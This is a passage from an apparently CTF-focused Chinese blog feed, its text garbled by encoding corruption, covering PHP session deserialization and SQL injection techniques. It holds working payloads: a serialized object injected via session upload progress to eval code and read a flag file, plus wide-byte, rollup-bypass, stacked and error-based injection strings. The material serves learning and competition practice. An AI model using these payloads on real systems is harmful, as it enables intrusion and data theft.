ç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ã€‚</p><h3 id="è®¾ç½®sessionåºåˆ—åŒ–æ–¹æ³•å¯èƒ½å¸¦æ¥çš„éšæ‚£"><a href="#è®¾ç½®sessionåºåˆ—åŒ–æ–¹æ³•å¯èƒ½å¸¦æ¥çš„éšæ‚£" class="headerlink" title="è®¾ç½®sessionåºåˆ—åŒ–æ–¹æ³•å¯èƒ½å¸¦æ¥çš„éšæ‚£"></a>è®¾ç½®sessionåºåˆ—åŒ–æ–¹æ³•å¯èƒ½å¸¦æ¥çš„éšæ‚£</h3><p>å¦‚æœæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå†™å…¥sessionçš„è„šæœ¬</p><pre><code>&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$name = $_GET[&apos;name&apos;] ? $_GET[&apos;name&apos;] : &quot;name&quot;; $value = $_GET[&apos;value&apos;] ? $_GET[&apos;value&apos;] : &quot;value&quot;;$_SESSION[name] = $value;  if(isset($_GET[&apos;clean&apos;])) session_destroy();</code></pre><p>æ­¤æ—¶æˆ‘ä»¬ä¼ å…¥<code>value=|s:5:&quot;hack!&quot;;</code>,åœ¨è¿›è¡Œsessionå­˜å‚¨æ—¶çš„å†…å®¹å°±ä¼šå˜æˆï¼š<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.æˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨<code>php_serialize</code>ä¸­<code>a</code>ä»£è¡¨ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«ä¸€ä¸ªå…ƒç´ ï¼Œä½†æ˜¯å¦‚æœå…¶ä»–çš„phpé¡µé¢æ²¡æœ‰è®¾ç½®å¤„ç†å™¨ä¸º<code>php_serialize</code>è€Œä½¿ç”¨é»˜è®¤çš„phpï¼Œé‚£ä¹ˆåœ¨phpè§£é‡Šsessionä¸­çš„å†…å®¹æ—¶ï¼Œ<code>|</code>å‰çš„éƒ¨åˆ†ä¼šè¢«è§£é‡Šç§°é”®ï¼Œåçš„éƒ¨åˆ†ä¼šè¢«è§£é‡Šæˆå€¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„<code>s:5:&quot;hack!&quot;;</code>ä¼šè¢«è§£ææˆ<code>hack!&quot;</code>ï¼Œåé¢çš„<code>&quot;;</code>ä¼šè¢«å¿½ç•¥ã€‚,æœ€åè§£æçš„ç»“æœå°±æ˜¯<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤æ¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote><p>Session ä¸Šä¼ è¿›åº¦ </p></blockquote><blockquote><p>å½“ session.upload_progress.enabledINI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ </p></blockquote><blockquote><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ã€‚</p></blockquote><p>åœ¨POSTä¸€ä¸ªæ–‡ä»¶å‰ï¼Œé€šè¿‡<code>POST</code>ä¸€ä¸ªnameä¸º<code>Session.upload_progress</code>ï¼Œvalueä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªupload_idã€‚åœ¨æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸Šä¼ ä¿¡æ¯ã€‚åœ¨ä¸Šä¼ ç»“æŸåsessionä¸­çš„é”®å€¼å¯¹ä¼šç›´æ¥æ¶ˆå¤±ã€‚</p><p>åŒæ—¶è¿˜è¦æ³¨æ„<code>session.upload_progress.cleanup</code>è¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªé€‰é¡¹çš„æ„æ€æ˜¯åœ¨ä¸Šä¼ å®Œæˆæ—¶ä»sessionä¸­æ¸…é™¤ä¸Šä¼ è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¼€å¯ã€‚åœ¨å…³é—­åä¸Šä¼ ä¿¡æ¯ä¼šä¸€ç›´ä¿å­˜åœ¨sessionä¸­ã€‚</p><p>é€šè¿‡ä¸Šé¢ä¸¤éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥æ›´æ”¹sessionä¸ºè‡ªå®šä¹‰æ•°æ®ã€‚</p><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJä¸Šçš„é¢˜ç›®ï¼Œé¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>è§‚å¯Ÿåˆ°é¢˜ç›®phpinfoä¸­çš„é…ç½®</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>æ„é€ ä¸€ä¸ªPOSTé¡µé¢</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>ç”±é¢˜ç›®çš„<code>phpinfo</code>å¯çŸ¥ï¼Œå…¨å±€sessionåºåˆ—åŒ–å™¨è®¾ç½®ä¸ºäº†<code>php_serialize</code>ï¼Œå› æ­¤<code>upload_progress</code>ä¼šç”¨<code>php_serialize</code>çš„æ–¹å¼åˆ›å»º<code>session</code>æ–‡ä»¶.åœ¨æ‰§è¡Œ<code>index.php</code>æ—¶ï¼Œè¯¥ä»£ç å°†å¤„ç†å™¨è®¾ç½®ä¸ºäº†php,ç„¶å<code>session_start()</code>æ¥è¯»å–sessionæ–‡ä»¶ã€‚ç”±ä¸Šæ–‡çš„phpåºåˆ—åŒ–å™¨å¤„ç†æ–¹å¼å¯çŸ¥æˆ‘ä»¬åœ¨sessionä¸­æ„é€ <code>|åºåˆ—åŒ–å­—ç¬¦ä¸²</code>å°±å¯ä»¥ã€‚åŒæ—¶è¯¥é¢˜ç›®çš„<code>cleanup</code>ä¹Ÿè®¾ç½®ä¸ºäº†<code>off</code></p><p>ç„¶åè¿›è¡Œåºåˆ—åŒ–ã€‚å°†å¤„ç†å™¨è®¾ç½®ä¸º<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>å¾—åˆ°</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>å…ˆåœ¨æœ¬åœ°æ‰“å¼€POSTé¡µé¢ï¼Œéšä¾¿æäº¤ä¸€ä¸ªä¸œè¥¿ç„¶åæŠ“åŒ…å°†<code>filename</code>æ”¹ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚åŒæ—¶ä¸ºäº†è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœè¦åœ¨æœ€å‰é¢åŠ ä¸Š<code>|</code>ï¼ŒåŒæ—¶ä¸ºäº†é˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰é¢åŠ ä¸Š<code>\</code>.</p><p>è¯»åˆ°å¦‚ä¸‹ä¿¡æ¯</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>ç”±<code>phpinfo</code>ä¸­<code>Apache Environment</code>å¯çŸ¥é¢˜ç›®è·¯å¾„ä¸º<code>/opt/lampp/htdocs/index.php</code></p><p>äºæ˜¯æˆ‘ä»¬ä¿®æ”¹mdzzçš„å€¼ä¸º</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>å¾—åˆ°</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>æäº¤å¾—åˆ°flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2019/07/28/SQL/"/>
      <url>/2019/07/28/SQL/</url>
      
        <content type="html"><![CDATA[<p>å¤§å¤§å°å°æ¯”èµ›ç¢°åˆ°äº†å¥½å¤šè¦ä¸æ²¡è§è¿‡è¦ä¸ä¸ä¼šçš„æ³¨å…¥ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å§</p><a id="more"></a><hr><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>GBKæ˜¯ä¸€ç§å¤šå­—ç¬¦çš„ç¼–ç ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªGBKç¼–ç çš„å­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªUTF-8çš„å­—ç¬¦å ç”¨ä¸‰ä¸ªå­—èŠ‚ã€‚</p><p><strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼šä¸ºäº†è¿‡æ»¤ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œå¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦åŠ ä¸Šåæ–œæ â€<br>â€œè¿›è¡Œè½¬ä¹‰ï¼Œmysqlä¸­è½¬ä¹‰å‡½æ•°æœ‰</p><pre><code>addslashes,mysql_real_escape_string,mysql_escape_stringç­‰ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é…ç½®magic_quote_gpc,ä¸è¿‡é«˜ç‰ˆæœ¬å·²ç»ç§»é™¤è¯¥åŠŸèƒ½</code></pre><p><strong>å®½å­—èŠ‚æ³¨å…¥</strong>æ˜¯æŒ‡mysqlæ•°æ®åº“åœ¨ä½¿ç”¨GBKç¼–ç æ—¶ä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­(å‰ä¸€ä¸ªå­—ç¬¦çš„asciiç è¦å¤§äº128æ‰åˆ°æ±‰å­—èŒƒå›´)ï¼Œè€Œä¸”å½“æˆ‘ä»¬å¼•å…¥å•å¼•å·æ—¶ï¼Œmysqlä¼šè°ƒç”¨è½¬ä¹‰å‡½æ•°ï¼Œå°†å•å¼•å·å˜ä¸º&#39;,å…¶ä¸­çš„ \ åå…­è¿›åˆ¶ä¸º%5C,mysqlçš„GBKç¼–ç ä¼šè®¤ä¸º %df%5C æ˜¯ä¸€ä¸ªå®½å­—èŠ‚ï¼Œä»è€Œä½¿å•å¼•å·é—­åˆ(é€ƒé€¸)ï¼Œä»è€Œæ³¨å…¥æ”»å‡»ã€‚</p><p><strong>sqlæ•°æ®çš„å˜åŒ–è¿‡ç¨‹</strong></p><pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;é‹&apos;ç”¨æˆ·è¾“å…¥--&gt;è¿‡æ»¤å‡½æ•°--&gt;ä»£ç å±‚$sql--&gt;mysqlå¤„ç†è¯·æ±‚--&gt;mysqlä¸­çš„sql</code></pre><p>æµ‹è¯•é¢˜ç›®æ˜¯å—é‚®çš„GBK injection</p><p>æµ‹è¯•å‘ç°åŠ ä¸Šå•å¼•å·æ²¡æœ‰æŠ¥é”™ä½†æ˜¯æœ‰è½¬ä¹‰æ“ä½œï¼Œåœ¨å•å¼•å·å‰é¢æ’å…¥äº†åæ–œæ </p><pre><code>?id=1&apos;        your sql:select id,title from news where id = &apos;1\&apos;&apos;</code></pre><p>è¿›è¡Œå®½å­—èŠ‚æ³¨å…¥</p><pre><code>?id=1%df%27your sql:select id,title from news where id = &apos;1é‹&apos;&apos;</code></pre><p>å¦‚ä¸Šæ‰€è¿°ï¼ŒåŠ å…¥%dfä¹‹åmysqlè®¤ä¸º%df%5Cæ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·å•å¼•å·å°±é€ƒé€¸å‡ºæ¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜ä¼šæŠ¥é”™ï¼Œå› ä¸ºæˆ‘ä»¬äººä¸ºçš„é—­åˆäº†ä¸€ä¸ªå•å¼•å·ä¹‹åæŸ¥è¯¢è¯­å¥é•¿è¿™æ ·</p><pre><code>id=&apos;é‹&apos;&apos;</code></pre><p>æˆ‘ä»¬è¿˜è¦æŠŠæœ€åä¸€ä¸ªå•å¼•å·æ³¨é‡Šæ‰æ‰è¡Œ</p><pre><code>?id=1%df%27%23</code></pre><p>æ³¨å…¥æˆåŠŸï¼Œè¯¥æŸ¥è¯¢å­—æ®µæ•°ï¼ŒæŸ¥è¯¢å­—æ®µæ•°è¦ç”¨unionæ¢æµ‹å†…å®¹ï¼Œè€Œunionå¾—è§„åˆ™æ˜¯å¿…é¡»åˆ—æ•°ç›¸åŒæ‰èƒ½æ­£å¸¸å±•ç¤ºï¼Œæ‰€ä»¥è¦æ¢æµ‹åˆ—æ•°ï¼Œä¿è¯æ„é€ çš„æŸ¥è¯¢ç»“æœä¸å…ƒæ•°æ®æŸ¥è¯¢ç»“æœçš„æ•°æ®ç»“æ„ç›¸åŒï¼›â€™order by 1â€™ä»£è¡¨æŒ‰ç¬¬ä¸€åˆ—å‡åºæ’åˆ—ï¼Œæ•°å­—ä»£è¡¨çš„åˆ—ä¸å­˜åœ¨å°±ä¼šæŠ¥é”™</p><pre><code>?id=1%df%27 order by 2 %23your sql:select id,title from news where id = &apos;1é‹&apos; order by 2 #&apos;here is the information</code></pre><p>å†æ¢æµ‹å­—æ®µçš„æ˜¾ç¤ºä½ï¼Œå³è¡¨ä¸­æ•°æ®ç¬¬å‡ ä½çš„å­—æ®µå¯ä»¥æ˜¾ç¤ºã€‚idçš„å€¼è¦ç”¨-1æˆ–è€…è¡¨ä¸­æ²¡æœ‰ç”¨è¿‡çš„idå€¼ï¼Œå¦åˆ™æµ‹è¯•å€¼ä¼šè¢«è¦†ç›–ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„æ³¨å…¥</p><pre><code>æ•°æ®åº“?id=-1%df%27 union select 1,group_concat(database()) %23è¡¨?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23å­—æ®µ?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23å› ä¸ºè¿™å¯¹å•å¼•å·çš„è½¬ä¹‰ï¼Œæˆ‘ä»¬ä½¿ç”¨åå…­è¿›åˆ¶æ¥è¯»å–ä¿¡æ¯?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id="ISCCä¸­ç¢°åˆ°çš„group-byâ€¦with-rollup"><a href="#ISCCä¸­ç¢°åˆ°çš„group-byâ€¦with-rollup" class="headerlink" title="ISCCä¸­ç¢°åˆ°çš„group byâ€¦with rollup"></a>ISCCä¸­ç¢°åˆ°çš„group byâ€¦with rollup</h2><p>é¢˜ç›®æ¥è‡ªISCCçº¿ä¸‹èµ›hint.txt</p><pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;$query = mysqli_query($con,$sql); if (mysqli_num_rows($query) == 1) {     $key = mysqli_fetch_array($query);    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {        echo &quot;xxxxxxxxx&quot;;    }else{        echo &quot;ä½ è¿™å¯†ç ä¸å¤ªå¯¹å•Š&quot;;    }}else if(mysqli_num_rows($query) == 0){    echo &quot;ä½ è¿™å¯†ç ä¸å¤ªå¯¹å•Š&quot;;}else{    echo &quot;æ•°æ®å¤ªå¤šäº†&quot;;}</code></pre><p>åˆ†æé¢˜ç›®å¯çŸ¥æˆ‘ä»¬éœ€è¦postä¸€ä¸ªunameï¼Œè¿›è¡Œå¼±æ¯”è¾ƒç›¸ç­‰ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œç„¶åæˆ‘ä»¬ä¹Ÿpostä¸€ä¸ªç©ºå€¼å°±è¡Œäº†ã€‚</p><p>group by åˆ†æ</p><pre><code>mysql&gt; select * from member;+----+----------+--------------------------------------+-------------------+| id | username | pws                                  | email             |+----+----------+--------------------------------------+-------------------+|  1 | vince    | e10adc3949ba59abbe56e                   | vince@pikachu.com ||  2 | allen    | e10adc3949ba59abbe56e                   | allen@pikachu.com ||  3 | kobe     | e10adc3949ba59abbe56ekes                | kobe@pikachu.com  ||  4 | grady    | e10adc3949ba59abbe56e                 | grady@pikachu.com ||  5 | kevin    | e10adc3949ba59abbe56ema City Thunder | kevin@pikachu.com ||  6 | lucy     | e10adc3949ba59abbe56e                   | lucy@pikachu.com  ||  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |+----+----------+--------------------------------------+-------------------+mysql&gt; select username from member where sex=&apos;boy&apos; group by username;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|+----------+5 rows in set (0.00 sec)</code></pre><p>group by å¯¹ç»“æœè¿›è¡Œåˆ†ç±»ï¼Œè€Œwith rollupå­—å¥å°†åœ¨æŸ¥è¯¢çš„ç»“æœæœ€åä¸€è¡Œæ·»ä¸Šä¸€è¡Œæ•°æ®ï¼Œæ¥æ˜¾ç¤ºåˆ†ç»„ç»Ÿè®¡çš„åŸºç¡€ä¸Šå†è¿›è¡Œæ•°æ®çš„æ±‡æ€»ï¼Œä½†æ˜¯è¿™é‡Œçš„æ±‡æ€»ä¸æ˜¯ç®€å•çš„æ±‚å’Œï¼Œè€Œæ˜¯è¦æ ¹æ®å¯¹æ•°æ®å¤„ç†é‡‡ç”¨çš„å‡½æ•°å†³å®šçš„</p><pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|| NULL |+----------+6 rows in set (0.00 sec)</code></pre><p>å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾—æŸ¥è¯¢çš„ç»“æœä¸ä¸ºç©ºã€‚å¯ä»¥ä½¿ç”¨å¼‚æˆ–æ¥ç»•è¿‡åˆ¤æ–­ã€‚åŒæ—¶é…åˆphpçš„æ¯”è¾ƒç‰¹æ€§æ¥ç»•è¿‡å¯¹unameçš„åˆ¤æ–­ã€‚</p><pre><code> mysql&gt; select 1^1;+-----+| 1^1 |+-----+|   0 |+-----+1 row in set (0.00 sec)mysql&gt; select &apos;aaa&apos;=1;+---------+| &apos;aaa&apos;=1 |+---------+|   0 |+---------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id&apos;=0;+--------+| &apos;id&apos;=0 |+--------+|  1 |+--------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id111&apos;=0;+-----------+| &apos;id111&apos;=0 |+-----------+| 1 |+-----------+1 row in set, 1 warning (0.00 sec)uname=&apos;1&apos;^1--&gt;uname=0--&gt;ç›¸ç­‰#å¼‚æˆ–æ“ä½œå¯¹ä»»ä¸€æ“ä½œæ•°ä¸ºNULLåˆ™è¿”å›NULLï¼Œå¯¹äºéNULLå¾—æ“ä½œæ•°ï¼Œå¦‚æœå¥‡æ•°ä¸ªæ“ä½œæ•°éé›¶ï¼Œåˆ™å€¼ä¸º1ï¼Œå¦åˆ™ä¸ºé›¶ã€‚</code></pre><p>æœ€åpayloadä¸ºï¼š</p><pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>ç¨å¾®è§£é‡Šä¸€ä¸‹limit offset</p><pre><code>mysql&gt; select * from member limit 3 offset 1;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)ä»ç¬¬ä¸€è¡Œå¼€å§‹æ‰“å°3è¡Œæ•°æ®mysql&gt; select * from member limit 1,3;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)ä»ç¬¬ä¸€è¡Œå¼€å§‹æ‰“å°ä¸‰è¡Œ</code></pre><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨limit 1ï¼Œ1 å‘¢ï¼Ÿå› ä¸ºè¿‡æ»¤äº†é€—å·ã€‚</p><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡SQLè¯­å¥ï¼Œä¹‹é—´ç”¨åˆ†å·â€™;â€™éš”å¼€.ä¸union select è”åˆæŸ¥è¯¢ä¸åŒï¼Œå †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»ä½•è¯­å¥ï¼Œè€Œåè€…åªèƒ½æ‰§è¡Œæœ‰é™çš„(åˆ—æ•°ç›¸åŒ)ã€‚</p><pre><code>mysql&gt; show tables;+----------------+| Tables_in_ctf4 |+----------------+| admin           || news           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from admin;select * from news;+-----+-------+----------------------------------+| uid | name  | pass                              |+-----+-------+----------------------------------+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |+-----+-------+----------------------------------+1 row in set (0.04 sec)+-----+--------+--------------------------+| tid | title  | content                    |+-----+--------+--------------------------+|   1 | heihei | ç»‚ç»˜åšé”ç†·å¼µæ©æˆœç°¡æ¶“â‚¬å§?    ||   2 | haha   | æ¤¹îƒ¿ç¬‚çè¾¨åšé”ç†¶ç°¡          |+-----+--------+--------------------------+2 rows in set (0.03 sec)</code></pre><p>å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œå…¶å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ï¼Œåˆæˆ–è€…æƒé™çš„é™åˆ¶åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨mysqli_multi_query()å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥è¯´å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œä¸€æ—¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå°†å¯èƒ½å¯¹ç½‘ç«™é€ æˆååˆ†å¤§çš„å¨èƒã€‚åšè¿‡çš„å‡ é“é¢˜éƒ½æ˜¯ç”¨çš„MariaDB</p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><ul><li>å…³é”®å‡½æ•°</li></ul><p>rand() ç”¨äºäº§ç”Ÿä¸€ä¸ª0~1çš„éšæœºæ•°</p><p>floor() å‘ä¸‹å–æ•´</p><p>rand()å‡½æ•°ç”Ÿæˆ0~1çš„å‡½æ•°ï¼Œä½¿ç”¨floor()å‡½æ•°å‘ä¸‹å–æ•´ï¼Œå€¼æ˜¯å›ºå®šçš„â€™0â€™ï¼Œæˆ‘ä»¬å°†rand*2ï¼Œå¾—åˆ°çš„å€¼å°±æ˜¯ä¸å›ºå®šçš„0æˆ–è€…1ã€‚</p><p>è¿™é‡Œä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨ä¸€ä¸ªå›ºå®šçš„å¸¸é‡æ¯”å¦‚1,0ï¼Ÿè€Œå¿…é¡»ä½¿ç”¨éšæœºå‡½æ•°ï¼Ÿå› ä¸ºæˆ‘ä»¬éœ€è¦ä½¿ç”¨å‡½æ•°åœ¨è°ƒç”¨æ—¶ä¼šè¢«æ‰§è¡Œçš„ç‰¹ç‚¹ã€‚</p><p>è¿™æ˜¯ä¸€å¥ç®€å•çš„æŸ¥è¯¢è¯­å¥</p><pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>åŠ ä¸Šéšæœºç§å­åæ˜¯ä¸€ä¸ªä¼ªéšæœºåºåˆ—ã€‚åŒæ—¶è¿™ä¸ªæŠ¥é”™ä¹Ÿä¸æ•°æ®é‡æœ‰å…³ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸‹æ–‡ä¼šåˆ†æ</p><p>ä¼ªéšæœºçš„åºåˆ—å‰å‡ ä½æ˜¯</p><pre><code>+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 ||                1 